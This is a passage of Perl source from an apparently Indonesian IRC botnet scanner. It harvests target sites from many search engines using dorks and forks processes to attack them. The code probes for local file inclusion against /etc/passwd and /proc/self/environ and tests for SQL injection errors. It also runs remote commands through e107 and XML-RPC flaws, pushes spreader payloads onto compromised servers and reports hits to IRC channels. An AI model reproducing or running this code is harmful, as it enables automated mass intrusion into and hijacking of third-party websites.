        elsif ($qlfi !~ /root:(.+):(.+):(.+):(.+):(.+):(.+)/){ $qlfi = bukasitus("http://".$situs.$bug."../../../../../etc/passwd%00"); if ($qlfi =~ /root:(.+):(.+):(.+):(.+):(.+):(.+)/){$qlfienviron = bukasitus("http://".$situs.$bug."../../../../../proc/self/environ%00"); if($qlfienviron =~ /HTTP_USER_AGENT/){safemode(1,$chan,$situs,$bug."../../../../../proc/self/environ%00&Origins=",$engine); sleep($conf{sleepz});}else{ irc_msg($chan,"[".$colz{6}."LFI".$colz{1}."][".$colz{3}." http://".$situs.$bug."../../../../../etc/passwd%00".$colz{1}." ]");}}}
        elsif ($qlfi !~ /root:(.+):(.+):(.+):(.+):(.+):(.+)/){ $qlfi = bukasitus("http://".$situs.$bug."../../../../etc/passwd%00"); if ($qlfi =~ /root:(.+):(.+):(.+):(.+):(.+):(.+)/){$qlfienviron = bukasitus("http://".$situs.$bug."../../../../proc/self/environ%00"); if($qlfienviron =~ /HTTP_USER_AGENT/){safemode(1,$chan,$situs,$bug."../../../../proc/self/environ%00&Origins=",$engine); sleep($conf{sleepz});}else{ irc_msg($chan,"[".$colz{6}."LFI".$colz{1}."][".$colz{3}." http://".$situs.$bug."../../../../etc/passwd%00".$colz{1}." ]");}}}
        elsif ($qlfi !~ /root:(.+):(.+):(.+):(.+):(.+):(.+)/){ $qlfi = bukasitus("http://".$situs.$bug."../../../etc/passwd%00"); if ($qlfi =~ /root:(.+):(.+):(.+):(.+):(.+):(.+)/){$qlfienviron = bukasitus("http://".$situs.$bug."../../../proc/self/environ%00"); if($qlfienviron =~ /HTTP_USER_AGENT/){safemode(1,$chan,$situs,$bug."../../../proc/self/environ%00&Origins=",$engine); sleep($conf{sleepz});}else{ irc_msg($chan,"[".$colz{6}."LFI".$colz{1}."][".$colz{3}." http://".$situs.$bug."../../../etc/passwd%00".$colz{1}." ]");}}}
        elsif ($qlfi !~ /root:(.+):(.+):(.+):(.+):(.+):(.+)/){ $qlfi = bukasitus("http://".$situs.$bug."../../etc/passwd%00"); if ($qlfi =~ /root:(.+):(.+):(.+):(.+):(.+):(.+)/){$qlfienviron = bukasitus("http://".$situs.$bug."../../proc/self/environ%00"); if($qlfienviron =~ /HTTP_USER_AGENT/){safemode(1,$chan,$situs,$bug."../../proc/self/environ%00&Origins=",$engine); sleep($conf{sleepz});}else{ irc_msg($chan,"[".$colz{6}."LFI".$colz{1}."][".$colz{3}." http://".$situs.$bug."../../etc/passwd%00".$colz{1}." ]");}}}
        elsif ($qlfi !~ /root:(.+):(.+):(.+):(.+):(.+):(.+)/){ $qlfi = bukasitus("http://".$situs.$bug."../etc/passwd%00"); if ($qlfi =~ /root:(.+):(.+):(.+):(.+):(.+):(.+)/){$qlfienviron = bukasitus("http://".$situs.$bug."../proc/self/environ%00"); if($qlfienviron =~ /HTTP_USER_AGENT/){safemode(1,$chan,$situs,$bug."../proc/self/environ%00&Origins=",$engine); sleep($conf{sleepz});}else{ irc_msg($chan,"[".$colz{6}."LFI".$colz{1}."][".$colz{3}." http://".$situs.$bug."../etc/passwd%00".$colz{1}." ]");}}}

        else {
            $q = bukasitus("http://".$situs.$bug.$xsslfitst);
            if ($q =~ /root:(.+):(.+):(.+):(.+):(.+):(.+)/)                { irc_msg($chan,"[".$colz{6}."XSSLFI".$colz{1}."][".$colz{3}." http://".$situs.$bug."../../../../../../../../../../etc/passwd/[512b]/..".$colz{1}."]");        }
        }
    }
        }
      }
      exit(0);
    }
    $num++;
  }
  irc_msg($chan,$colz{5}."MeNunGGu ".scalar(@prosesbaru)." PID ProSes EksPLoiTasi..") if (!$engine);
  foreach my $f (@prosesbaru) { waitpid($f,0); }
  irc_msg($chan,$colz{5}." $engine FiNizZ! ") if ($engine);
}

sub crsql_eksploit {
  my ($chan,$bug,$dork,$tf,$engine,$type) = @_;
  my @prosesbaru;
  my @semuatarget;
  my $hitung;
  my $num = 0;
  unless (open(FILEZ,"< $tf")) { msge($chan,"FILE",$colz{5}."Ga BiSa BuKa $tf!"); return; }
  while (my $r = <FILEZ>) { $r =~ s/\n//g; push(@semuatarget,$r); }
  close(FILEZ);
  f_hapus($tf);
  my @kotor = lnk_sortir(@semuatarget);
  my @target = lnk_filter(@kotor);
  foreach my $situs (@target) {
    $hitung++;
    if ($hitung % $conf{rfipid} == 0) {
      foreach my $f (@prosesbaru) { waitpid($f,0); }
      $num = 0;
    }
    if ($hitung % $conf{rficnt2} == 0) {
      irc_msg($dbgchan,$situs) if ($conf{showsite} == 1);
      irc_msg($chan,$colz{14}." $engine ".$colz{6}." ".$hitung." ".$colz{1}."=> ".$colz{14}." ".scalar(@target). " ");
    }
    $prosesbaru[$num] = fork();
    if ($prosesbaru[$num] == 0) {
    my $q;
    if ($type == 1){
        $q = bukasitus("http://".$situs.$bug.$sqltest);
    } elsif ($type == 2){
        $q = bukasituscrxml("http://".$situs.$bug,"uname -a");
    }elsif ($type == 3){
        $q = bukasituscre107("http://".$situs.$bug,"Origins VURN");
    }elsif ($type == 4){
        $q = bukasitus("http://".$situs.$bug.$xsslfitst);
    }
    if ($q =~ /sql syntax/)                             { irc_msg($chan,"[".$colz{6}."SQL".$colz{1}."][".$colz{3}." http://".$situs.$bug." ".$colz{1}."]".$colz{14}." foud error : sql syntax");            }
    elsif ($q =~ /sql error/)                             { irc_msg($chan,"[".$colz{6}."SQL".$colz{1}."][".$colz{3}." http://".$situs.$bug." ".$colz{1}."]".$colz{14}." foud error : sql error");            }
    elsif ($q =~ /right syntax to use near/)                    { irc_msg($chan,"[".$colz{6}."SQL".$colz{1}."][".$colz{3}." http://".$situs.$bug." ".$colz{1}."]".$colz{14}." foud error : right syntax to use near");    }
    elsif ($q =~ /syntax error converting/)                        { irc_msg($chan,"[".$colz{6}."SQL".$colz{1}."][".$colz{3}." http://".$situs.$bug." ".$colz{1}."]".$colz{14}." foud error : syntax error converting");    }
    elsif ($q =~ /unclosed quotation/)                         { irc_msg($chan,"[".$colz{6}."SQL".$colz{1}."][".$colz{3}." http://".$situs.$bug." ".$colz{1}."]".$colz{14}." foud error : unclosed quotation");        }
    elsif (($q =~ /e107/) && ($q =~ /Origins(.*)scanner/))                { my $uname = $1; $uname=~s/\n//;    $uname=~s/\r//; my $cekuname = $uname; if($cekuname =~ /php_uname/){ $uname = ""; } if($cekuname =~ /http/){ $uname = ""; } if($cekuname =~ /</){ $uname = ""; }   bukasituscre107spred("http://".$situs.$bug,$Originscmd); bukasituscre107spred("http://".$situs.$bug,$e107sprd4); bukasituscre107spred("http://".$situs.$bug,$e107sprd3); bukasituscre107spred2("http://".$situs.$bug,$prl); bukasituscre107spred("http://".$situs.$bug,$e107sprd2); bukasituscre107spred("http://".$situs.$bug,$e107sprd);
                                              my $e107safe = bukasituscre107("http://".$situs.$bug,"id"); if ($e107safe =~ /uid=/){
                                              irc_msg($dbgchan,"[".$colz{6}."e107".$colz{1}."][".$colz{3}." http://".$situs.$bug." ".$colz{1}."] ".$colz{1}."[".$colz{7}."OFF".$colz{1}."] ".$colz{14}.$uname); irc_msg($chan,"[".$colz{6}."e107".$colz{1}."][".$colz{3}." http://".$situs.$bug." ".$colz{1}."] ".$colz{1}."[".$colz{7}."OFF".$colz{1}."] ".$colz{14}.$uname); } else {
                                              irc_msg($chan,"[".$colz{6}."e107".$colz{1}."][".$colz{3}." http://".$situs.$bug." ".$colz{1}."] ".$colz{1}."[".$colz{5}."ON" .$colz{1}."] ".$colz{14}.$uname);  
                                              bukasituscre107spred2("http://".$situs.$bug,$prl);
                                              }
                                              }
    elsif (($q =~ /Origins(.*)scanner/s) && ($bug !~ /contact.php/))            { my $uname = $1; $uname=~s/\n//;    $uname=~s/\r//; my $cekuname = $uname; if($cekuname =~ /uname -a/){ $uname = ""; } if($cekuname =~ /http/){ $uname = ""; } if($cekuname =~ /</){ $uname = ""; }
                                              irc_msg($chan,"[".$colz{6}."XML".$colz{1}."][".$colz{3}." http://".$situs.$bug." ".$colz{1}."] ".$colz{14}.$uname); bukasituscrxml("http://".$situs.$bug,$e107cmdsp3); bukasituscrxml("http://".$situs.$bug,$e107cmdsp2); bukasituscrxml("http://".$situs.$bug,$e107cmdsp); }
    elsif ($q =~ /root:(.+):(.+):(.+):(.+):(.+):(.+)/)                { irc_msg($chan,"[".$colz{6}."XSSLFI".$colz{1}."][".$colz{3}." http://".$situs.$bug."../../../../../../../../../../etc/passwd/[512b]/..".$colz{1}."]");        }
    exit(0);
    }
    $num++;
  }
  irc_msg($chan,$colz{5}."MeNunGGu ".scalar(@prosesbaru)." PID ProSes EksPLoiTasi..") if (!$engine);
  foreach my $f (@prosesbaru) { waitpid($f,0); }
  irc_msg($chan,$colz{5}." $engine FiNizZ! ") if ($engine);
}
###########################
##[ RUTIN SEARCH ENGINE ]##
###########################
sub s_cari {
  #Type: 1 = Cari saja, 2 = Cari dan eksploit, 3 = Cari dan eksploit Joomla
  my ($chan,$dork,$nf,$bug,$type) = @_;
  my @engz;
  my $key = $dork;
  $dork = urlen($key);
  $engz[0]  = fork(); if ($engz[0]  == 0) { s_engine("google",        "Google"    ,$type,$chan,$bug,$dork,$nf); exit; }
  $engz[1]  = fork(); if ($engz[1]  == 0) { s_engine("netscape",    "Netscape"    ,$type,$chan,$bug,$dork,$nf); exit; }
  $engz[2]  = fork(); if ($engz[2]  == 0) { s_engine("yahoo",        "Yahoo"        ,$type,$chan,$bug,$dork,$nf); exit; }
  $engz[3]  = fork(); if ($engz[3]  == 0) { s_engine("live",        "Live"        ,$type,$chan,$bug,$dork,$nf); exit; }
  $engz[4]  = fork(); if ($engz[4]  == 0) { s_engine("google2",        "Google2"    ,$type,$chan,$bug,$dork,$nf); exit; }
  $engz[5]  = fork(); if ($engz[5]  == 0) { s_engine("altavista",    "Altavista"    ,$type,$chan,$bug,$dork,$nf); exit; }
  $engz[6]  = fork(); if ($engz[6]  == 0) { s_engine("alltheweb",    "AllTheWeb"    ,$type,$chan,$bug,$dork,$nf); exit; }
  $engz[7]  = fork(); if ($engz[7]  == 0) { s_engine("goodsrch",    "GoodSearch"    ,$type,$chan,$bug,$dork,$nf); exit; }
  $engz[8]  = fork(); if ($engz[8]  == 0) { s_engine("lycos",        "Lycos"        ,$type,$chan,$bug,$dork,$nf); exit; }
  $engz[9]  = fork(); if ($engz[9]  == 0) { s_engine("uol",        "Uol"        ,$type,$chan,$bug,$dork,$nf); exit; }
  $engz[10] = fork(); if ($engz[10] == 0) { s_engine("virgilio",    "Virgilio"    ,$type,$chan,$bug,$dork,$nf); exit; }
  $engz[11] = fork(); if ($engz[11] == 0) { s_engine("webde",        "Web.de"    ,$type,$chan,$bug,$dork,$nf); exit; }
  $engz[12] = fork(); if ($engz[12] == 0) { s_engine("clusty",        "Clusty"    ,$type,$chan,$bug,$dork,$nf); exit; }
  $engz[13] = fork(); if ($engz[13] == 0) { s_engine("hotbot",        "Hotbot"    ,$type,$chan,$bug,$dork,$nf); exit; }
  foreach my $e (@engz) { waitpid($e,0); }
}

sub crsql_cari {
  my ($chan,$bug,$dork,$nf,$type) = @_;
  my @engz;
  my $key = $dork;
  $dork = urlen($key);
  $engz[0]  = fork(); if ($engz[0]  == 0) { crsql_engine("google",    "Google"    ,$chan,$bug,$dork,$nf,$type); exit; }
  $engz[1]  = fork(); if ($engz[1]  == 0) { crsql_engine("netscape",    "Netscape"    ,$chan,$bug,$dork,$nf,$type); exit; }
  $engz[2]  = fork(); if ($engz[2]  == 0) { crsql_engine("yahoo",    "Yahoo"        ,$chan,$bug,$dork,$nf,$type); exit; }
  $engz[3]  = fork(); if ($engz[3]  == 0) { crsql_engine("live",    "Live"        ,$chan,$bug,$dork,$nf,$type); exit; }
  $engz[4]  = fork(); if ($engz[4]  == 0) { crsql_engine("google2",    "Google2"    ,$chan,$bug,$dork,$nf,$type); exit; }
  $engz[5]  = fork(); if ($engz[5]  == 0) { crsql_engine("altavista",    "Altavista"    ,$chan,$bug,$dork,$nf,$type); exit; }
  $engz[6]  = fork(); if ($engz[6]  == 0) { crsql_engine("alltheweb",    "AllTheWeb"    ,$chan,$bug,$dork,$nf,$type); exit; }
  $engz[7]  = fork(); if ($engz[7]  == 0) { crsql_engine("goodsrch",    "GoodSearch"    ,$chan,$bug,$dork,$nf,$type); exit; }
  $engz[8]  = fork(); if ($engz[8]  == 0) { crsql_engine("lycos",    "Lycos"        ,$chan,$bug,$dork,$nf,$type); exit; }
  $engz[9]  = fork(); if ($engz[9]  == 0) { crsql_engine("uol",        "Uol"        ,$chan,$bug,$dork,$nf,$type); exit; }
  $engz[10] = fork(); if ($engz[10] == 0) { crsql_engine("virgilio",    "Virgilio"    ,$chan,$bug,$dork,$nf,$type); exit; }
  $engz[11] = fork(); if ($engz[11] == 0) { crsql_engine("webde",    "Web.de"    ,$chan,$bug,$dork,$nf,$type); exit; }
  $engz[12] = fork(); if ($engz[12] == 0) { crsql_engine("clusty",    "Clusty"    ,$chan,$bug,$dork,$nf,$type); exit; }
  $engz[13] = fork(); if ($engz[13] == 0) { crsql_engine("hotbot",    "Hotbot"    ,$chan,$bug,$dork,$nf,$type); exit; }
  foreach my $e (@engz) { waitpid($e,0); }
}

sub crsql_engine {
    my ($f,$se,$chan,$bug,$dork,$ef,$type) = @_;
    my @hc;
    if    ($f eq "google"   ) { @hc = se_google($chan,$dork,$ef); }
    elsif ($f eq "google2"  ) { @hc = se_google_m($chan,$dork,$ef); }
    elsif ($f eq "yahoo"    ) { @hc = se_yahoo($chan,$dork,$ef); }
    elsif ($f eq "altavista") { @hc = se_altavista($chan,$dork,$ef); }
    elsif ($f eq "alltheweb") { @hc = se_alltheweb($chan,$dork,$ef); }
    elsif ($f eq "goodsrch" ) { @hc = se_goodsearch($chan,$dork,$ef); }
    elsif ($f eq "lycos"    ) { @hc = se_lycos($chan,$dork,$ef); }
    elsif ($f eq "live"     ) { @hc = se_live($chan,$dork,$ef); }
    elsif ($f eq "hotbot"   ) { @hc = se_hotbot($chan,$dork,$ef); }
    elsif ($f eq "virgilio" ) { @hc = se_virgilio($chan,$dork,$ef); }
    elsif ($f eq "webde"    ) { @hc = se_webde($chan,$dork,$ef); }
    elsif ($f eq "uol"      ) { @hc = se_uol($chan,$dork,$ef); }
    elsif ($f eq "netscape" ) { @hc = se_netscape($chan,$dork,$ef); }
    elsif ($f eq "clusty"   ) { @hc = se_clusty($chan,$dork,$ef); }
    my @cl = lnk_sortir(@hc);
    msgr($chan,$colz{14}.$se,$colz{6}." ".scalar(@hc),$colz{14}."=(".$colz{6}."Xcode".$colz{14}.")=>".$colz{7}." ".scalar(@cl));
    if (scalar(@cl) == 0) { exit; }

      my $ef2 = $f.$ef;
      foreach my $e (@cl) { f_simpan($ef2,$e); }
      crsql_eksploit($chan,$bug,$dork,$ef2,$se,$type);
}

sub s_engine {
    my ($f,$se,$type,$chan,$bug,$dork,$ef) = @_;
    my @hc;
    if    ($f eq "google"   ) { @hc = se_google($chan,$dork,$ef); }
    elsif ($f eq "google2"  ) { @hc = se_google_m($chan,$dork,$ef); }
    elsif ($f eq "yahoo"    ) { @hc = se_yahoo($chan,$dork,$ef); }
    elsif ($f eq "altavista") { @hc = se_altavista($chan,$dork,$ef); }
    elsif ($f eq "alltheweb") { @hc = se_alltheweb($chan,$dork,$ef); }
    elsif ($f eq "goodsrch" ) { @hc = se_goodsearch($chan,$dork,$ef); }
    elsif ($f eq "lycos"    ) { @hc = se_lycos($chan,$dork,$ef); }
    elsif ($f eq "live"     ) { @hc = se_live($chan,$dork,$ef); }
    elsif ($f eq "hotbot"   ) { @hc = se_hotbot($chan,$dork,$ef); }
    elsif ($f eq "virgilio" ) { @hc = se_virgilio($chan,$dork,$ef); }
    elsif ($f eq "webde"    ) { @hc = se_webde($chan,$dork,$ef); }
    elsif ($f eq "uol"      ) { @hc = se_uol($chan,$dork,$ef); }
    elsif ($f eq "netscape" ) { @hc = se_netscape($chan,$dork,$ef); }
    elsif ($f eq "clusty"   ) { @hc = se_clusty($chan,$dork,$ef); }
    my @cl = lnk_sortir(@hc);
    msgr($chan,$colz{14}.$se,$colz{6}." ".scalar(@hc),$colz{14}."=(".$colz{6}."Xcode".$colz{14}.")=>".$colz{7}." ".scalar(@cl));
    if (scalar(@cl) == 0) { exit; }
    if ($type == 1) { foreach my $e (@cl) { f_simpan($ef,$e); } }
    else {
      my $ef2 = $f.$ef;
      foreach my $e (@cl) { f_simpan($ef2,$e); }
      if    ($type == 2) { s_eksploit(2,$chan,$bug,$dork,$ef2,$se); }
      elsif ($type == 3) { s_eksploit(3,$chan,$bug,$dork,$ef2,$se); }
    }
}
##[ GOOGLE ]##
sub se_google {
  my ($chan,$key,$nf) = @_;
  my @daftar;
  my $num = 50; my $max = 5000; my $p = 0;
  my $url = "http://www.google.co.id/search?q=".$key."$num=".$num."&filter=0&start=".$p;
  my $murl = "http://www.google.com";
  my $nxurl;
  my $q = bukasitus($url);
  if ( $q !~ /2010 Google/ ) { msge($chan,$colz{3}."Google",$colz{5}."Baned!!"); msge($chan,$colz{3}."Google bypas:",$colz{14}.$bypass."key=".$colz{3}.$key); @daftar = se_gbypass($chan,$key,$nf); }
  if ( $q =~ /dari sekitar <b>(.+?)<\/b>/ ) {
    my $h = $1; $h =~ s/,//g; msgt($chan,$colz{3}."Google",$colz{6}." $h");
  }
  if ( $q =~ /class=b><a href=\"(.*?)\">/ ) {
      my $nxurl = $1; if ($conf{showdbse} == 1){msgn($dbgchan,"Google","$nxurl");}
  }
  while ( $q =~ m/<h3 class=r><a href=\"http:\/\/(.*?)\"/g ) { push (@daftar, $1); }
  for ($p=50;$p<=$max;$p+=$num) {
    $nxurl = "http://www.google.co.id/search?q=".$key."$num=".$num."&filter=0&start=".$p;
    $q = bukasitus($nxurl);
    while ( $q =~ m/<h3 class=r><a href=\"http:\/\/(.*?)\"/g ) {  push (@daftar, $1);  }
    if ( $q !~ /<h3 class=r><a href=\"http:\/\/(.*?)\"/ ) { return @daftar;  }
  }
  return @daftar;
}
##[ GOOGLE BYPASS ]##
sub se_gbypass {
  my ($chan,$key,$nf) = @_;
  my @daftar;
  my $num = 50; my $max = 1000; my $p = 0;
  my $url = $bypass."?key=".$key."&max=".$max;
  my $nxurl;
  my $q = bukasitus($url);
  while ( $q =~ m/<h3 class=r><a href=\"http:\/\/(.*?)\"/g ) {  push (@daftar, $1);  }
  return @daftar;
}
##[ GOOGLE MULTI DOMAIN ]##
sub se_google_m {
  my ($chan,$key,$nf) = @_;
  my @daftar;
  my $num = 50; my $max = 5000; my $p;
  my @doms = (
    "com","ae","com.ar","at","com.au","be","com.br","ca","ch","cl","de","dk","fi","fr","gr","com.hk",
    "ie","co.il","it","co.jp","co.kr","lt","lv","nl","com.pa","com.pe","pl","pt","ru","com.sg",
    "com.tr","com.tw","com.ua","co.uk","hu");
  my $dom = $doms[rand(scalar(@doms))];
  my $url = "http://www.google.".$dom."/search?num=".$num."&q=".$key."&filter=0";
  my $murl = "http://www.google.".$dom;
  my $nxurl;
  my $q = bukasitus($url);
  if ( $q =~ /class=b><a href=\"(.*?)\">/ ) {
      my $nxurl = $1;
      if ($conf{showdbse} == 1){msgn($dbgchan,"Google.".$dom,$nxurl);}
      msgn($chan,$colz{3}."Google.".$dom,$colz{7}."LaGi NyAri..");
  }
  while ( $q =~ m/<h3 class=r><a href=\"http:\/\/(.*?)\"/g ) { push (@daftar, $1); }
  for ($p=50;$p<=$max;$p+=$num) {
    $nxurl = "http://www.google.".$dom."/search?num=".$num."&q=".$key."&start=".$p."&sa=N";
    $q = bukasitus($nxurl);
    while ( $q =~ m/<h3 class=r><a href=\"http:\/\/(.*?)\"/g ) {  push (@daftar, $1);  }
    if ( $q !~ /<h3 class=r><a href=\"http:\/\/(.*?)\"/ ) { return @daftar;  }
  }
  return @daftar;
}


##[ YAHOO ]##
sub se_yahoo {
  my ($chan,$key,$nf) = @_;
  my @daftar;
  my $num = 30; my $max = 8000; my $p = "1";
  my $url = "http://search.yahoo.com/search?p=".$key."&b=".$p;
  my $murl;
  my $nxurl;
  my $q = bukasitus($url);
  if ( $q =~ /id=\"infotext\"><p> .*? of(.*?) for/ ) {
    my $h = $1; $h =~ s/,//g; msgt($chan,$colz{3}."Yahoo",$colz{6}." $h");
  }
  if ( $q =~ /999 Unable to process request at this time/ ) { msge($chan,$colz{3}."Yahoo",$colz{5}."Banned!"); }
  if ( $q =~ /<a id=\"pg-next\" href=\"(.*?)\">Next/ ) {
      my $nxurl = $1; if ($conf{showdbse} == 1){msgn($dbgchan,"Yahoo","$nxurl");}
  }
  while ( $q =~ m/26u=(.*?)%26w=/g ) { push (@daftar, $1); }
  while ( $q =~ /<a id=\"pg-next\" href=\"(.*?)\">Next/ ) {
    $p++; if ( $p > $max ) { return @daftar; }
    $nxurl = $murl.htmltourl($1);
    $q = bukasitus($nxurl);
    while ( $q =~ m/26u=(.*?)%26w=/g ) { push (@daftar, $1); }
  }
  return @daftar;
}


##[ ALTAVISTA ]##
sub se_altavista {
  my ($chan,$key,$nf) = @_;
  my @daftar;
  my $num = 10; my $max = 500; my $p;
  for ($p=0;$p<=$max;$p += $num) {
  my $url = "http://de.altavista.com/web/results?fr=altavista&itag=ody&kgs=0&kls=&b=21&q=".$key."&stq=".$p;
  my $murl;
  my $nxurl;
  my $q = bukasitus($url);
  if ( $q =~ /<a href=\"(.*?)\" target=\"_self\">Next/ ) {
      my $nxurl = $1; if ($conf{showdbse} == 1){msgn($dbgchan,"Altavista","$nxurl");}
  }
  while ( $q =~ m/<span class=ngrn>(.*?) <\/span>/g ) { push (@daftar, $1); }
  while ( $q =~ /<a href=\"(.*?)\" target=\"_self\">Next/ ) {
    $nxurl = $murl.htmltourl($1);
    $q = bukasitus($nxurl);
    while ( $q =~ m/<span class=ngrn>(.*?) <\/span>/g ) { push (@daftar, $1); }
  }
}
  return @daftar;
}
##[ ALLTHEWEB ]##
sub se_alltheweb {
  my ($chan,$key,$nf) = @_;
  my @daftar;
  my $num = 100; my $max = 20; my $p = 1;
  #my $url = "http://localhost/search/www.alltheweb.com.htm";
  my $url = "http://www.alltheweb.com/search?cat=web&_sb_lang=any&hits=".$num."&q=".$key."&o=".$p;
  my $murl;
  my $nxurl;
  my $q = bukasitus($url);
  if ( $q =~ /<span class=\"ofSoMany\">(.+?)<\/span>/ ) {
    my $h = $1; $h =~ s/,//g; msgt($chan,$colz{3}."AllTheWeb",$colz{6}." $h");
  }
  if ( $q =~ /<a  href=\"(.*?)\" class=\"rnavLink\">Next/ ) {
      my $nxurl = $1; if ($conf{showdbse} == 1){msgn($dbgchan,"AllTheWeb","$nxurl");}
  }
  while ( $q =~ m/<span class=\"resURL\">http:\/\/(.+?)<\/span>/g ) { push (@daftar, $1); }
  while ( $q =~ /<a  href=\"(.*?)\" class=\"rnavLink\">Next/ ) {
    $nxurl = $murl.htmltourl($1);
    $q = bukasitus($nxurl);
    while ( $q =~ m/<span class=\"resURL\">http:\/\/(.+?)<\/span>/g ) { push (@daftar, $1); }
  }
  return @daftar;
}
##[ GOODSEARCH ]##
sub se_goodsearch {
  my ($chan,$key,$nf) = @_;
  my @daftar;
  my $num = 0; my $max = 300; my $p = 1;
  #my $url = "http://localhost/search/www.goodsearch.com.html";
  my $url = "http://www.goodsearch.com/Search.aspx?Keywords=".$key."&page=".$p."&osmax=".$num;
  my $murl = "http://www.goodsearch.com/";
  my $nxurl;
  my $q = bukasitus($url);
  if ( $q =~ /of about <strong>(.+?)<\/strong>/ ) {
    my $h = $1; $h =~ s/,//g; msgt($chan,$colz{3}."GoodSearch",$colz{6}." $h");
  }
  if ( $q =~ m/&nbsp;<span class=\"search_numberpager_nextprev\"><a href=\"(.+?)\">Next<\/a>/ ) {
      my $nxurl = $1; if ($conf{showdbse} == 1){msgn($dbgchan,"GoodSearch","$nxurl");}
  }
  while ( $q =~ m/<a href=\"(Redirect.+?)\">http:\/\/(.*?)<\/a>/g ) { push (@daftar, $2); }
  for ($p=2;$p<=$max;$p++) {
    $url = "http://www.goodsearch.com/Search.aspx?Keywords=".$key."&page=".$p."&osmax=".$num;
    $q = bukasitus($url);
    while ( $q =~ m/<a href=\"(Redirect.+?)\">http:\/\/(.*?)<\/a>/g ) { push (@daftar, $2); }
    if ( $q !~ m/<a href=\"(Redirect.+?)\">http:\/\/(.*?)<\/a>/g ) { return @daftar; }
  }
  return @daftar;
}
##[ UOL ]##
sub se_uol {
  my ($chan,$key,$nf) = @_;
  my @daftar;
  my $num = 10; my $max = 1000; my $p;
  #my $url = "http://localhost/search/busca.uol.com.br.htm";
  my $url = "http://mundo.busca.uol.com.br/buscar.html?q=".$key."";
  my $murl = "http://busca.uol.com.br";
  my $nxurl;
  my $q = bukasitus($url);
  if ( $q =~ /results\">(.+?)<\/strong>/ ) {
    my $h = $1; $h =~ s/,//g; msgt($chan,$colz{3}."Uol",$colz{6}." $h");
  }
  if ( $q =~ /<a href=\"(.*?)\" class=\"next\">/ ) {
      my $nxurl = htmltourl($1); if ($conf{showdbse} == 1){msgn($dbgchan,"Uol","$nxurl");}
  }
  while ( $q =~ m/<dt><a href=\"http:\/\/(.*?)\">/g ) { push (@daftar, $1); }
  for ($p=1;$p<=$max;$p += $num) {
    $q = bukasitus("http://mundo.busca.uol.com.br/buscar.html?q=".$key."&start=".$p);
    while ( $q =~ m/<dt><a href=\"http:\/\/(.*?)\">/g ) { push (@daftar, $1); }
    if ( $q !~ /<dt><a href/ ) { return @daftar; }
  }
  return @daftar;
}
##[ LIVE ]##
sub se_live {
  my ($chan,$key,$nf) = @_;
  my @daftar;
  my $num = 10; my $max = 100; my $p;
  #my $url = "http://localhost/search/search.live.com.htm";
  my $url = "http://search.live.com/results.aspx?q=".$key."&go";
  my $murl =  "http://search.live.com";
  my $nxurl;
  my $q = bukasitus($url);
  if ( $q =~ /<a  class=\"sb_pagN\" href=\"(.*?)\" onmousedown/ ) {
      my $nxurl = $1; if ($conf{showdbse} == 1){msgn($dbgchan,"Live",htmltourl($nxurl));}
  }
  while ( $q =~ m/<h3><a href=\"http:\/\/(.*?)\"/g ) {
    my $l = $1 ; if ($l !~ /google/) { push (@daftar, $l); }
  }
  for ( $p=0;$p<=$max;$p += $num ) {
    $nxurl = $murl.htmltourl($1)."&go";
    $q = bukasitus("http://search.live.com/results.aspx?q=".$key."&first=".$p."&FORM=PORE");
    while ( $q =~ m/<h3><a href=\"http:\/\/(.*?)\"/g ) {
      my $l = $1 ; if ($l !~ /google/) { push (@daftar, $l); }
    }
  }
  return @daftar;
}
##[ CLUSTY ]##
sub se_clusty {
  my ($chan,$key,$nf) = @_;
  my @daftar;
  my $num = 50;
  #my $url = "http://localhost/search/clusty.com.htm";
  my $url = "http://clusty.com/search?query=".$key."&input-form=clusty-simple&v:sources=webplus";
  my $murl = "http://clusty.com";
  my $nxurl;
  my $q = bukasitus($url);
  if ( $q =~ /intronum\">(.+?)<\/span>/ ) {
    my $h = $1; $h =~ s/,//g; msgt($chan,$colz{3}."Clusty",$colz{6}." $h");
  }
  if ( $q =~ /<a class=\"listnext\" href=\"(.*?)\">next/ ) {
      my $nxurl = $1; if ($conf{showdbse} == 1){msgn($dbgchan,"Clusty",htmltourl($nxurl));}
  }
  while ( $q =~ m/<a target=\"_top\" href=\"http:\/\/(.*?)\"/g ) { push (@daftar, $1); }
  while ( $q =~ /<a class=\"listnext\" href=\"(.*?)\">next/ ) {
    $nxurl = $murl.htmltourl($1);
    $q = bukasitus($nxurl);
    while ( $q =~ m/<a target=\"_top\" href=\"http:\/\/(.*?)\"/g ) { push (@daftar, $1); }
  }
  return @daftar;
}
##[ LYCOS ]##
sub se_lycos {
  my ($chan,$key,$nf) = @_;
  my @daftar;
  my $num = 10; my $max = 200;  my $p;
  #my $url = "http://localhost/search/search.lycos.com.htm";
  my $url = "http://search.lycos.com/?loc=searchbox&tab=web&adf=on&query=".$key."&submit=image";
  my $murl =  "http://search.lycos.com/";
  my $nxurl;
  my $q = bukasitus($url);
  if ( $q =~ /<a href=\"(.*?)\">Next/ ) {
    my $nxurl = $1; if ($conf{showdbse} == 1){msgn($dbgchan,"Lycos","$nxurl");}
  }
  while ( $q =~ m/<a href=\"http:\/\/(.*?)\" onmouseover/g ) { push (@daftar, $1); }
  for ( $p=0;$p<=$max;$p++ ) {
    $q = bukasitus("http://search.lycos.com/?query=".$key."&page2=".$p."&tab=web");
    while ( $q =~ m/<a href=\"http:\/\/(.*?)\" onmouseover/g ) { push (@daftar, $1); }
    if ( $q !~ m/<a href=\"http:\/\/(.*?)\" onmouseover/g ) { return @daftar; }
  }
  return @daftar;
}
##[ VIRGILIO ]##
sub se_virgilio {
  my ($chan,$key,$nf) = @_;
  my @daftar;
  my $num = 10; my $max = 1000; my $p = 1;
  for ( $p = 1;$p <= $max; $p += $num ) {
  my $url =  "http://ricerca.virgilio.it/ricerca?qs=".$key."&filter=1&site=&lr=&hits=10&offset=".$p;
  my $murl = "http://ricerca.virgilio.it/";
  my $nxurl;
  my $q = bukasitus($url);
  if ( $q =~ /<span>(.*?) risultati per <b>/ ) {
    my $h = $1; $h =~ s/,//g; $h =~ s/\.//g;
    msgt($chan,$colz{3}."Virgilio",$colz{6}." $h");
  }
  if ( $q =~ /<a href=\".*\s+<a href=\"(.*?)\"><span>Avanti/ ) {
      my $nxurl = $1; if ($conf{showdbse} == 1){msgn($dbgchan,"Virgilio","$nxurl");}
  }
  while ( $q =~ m/<h3><a href=\"http:\/\/(.*?)\" class/g ) { push (@daftar, $1); }
  while ( $q =~ /<a href=\".*\s+<a href=\"(.*?)\"><span>Avanti/ ) {
    $nxurl = $murl.htmltourl($1);
    $q = bukasitus($nxurl);
